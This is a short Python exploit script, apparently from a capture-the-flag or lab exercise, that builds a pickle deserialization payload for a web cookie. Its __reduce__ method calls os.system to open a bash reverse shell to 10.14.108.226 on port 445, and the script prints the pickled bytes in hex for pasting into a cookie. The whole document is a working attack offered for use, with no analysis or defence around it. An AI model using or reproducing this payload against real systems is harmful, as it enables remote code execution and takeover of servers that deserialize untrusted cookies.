import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/10.14.108.226/445 0>&1"',))

# build pickle payload
payload = pickle.dumps(RCE())

print("[*] Malicious cookie value:")
# get the hex value
print(payload.hex())
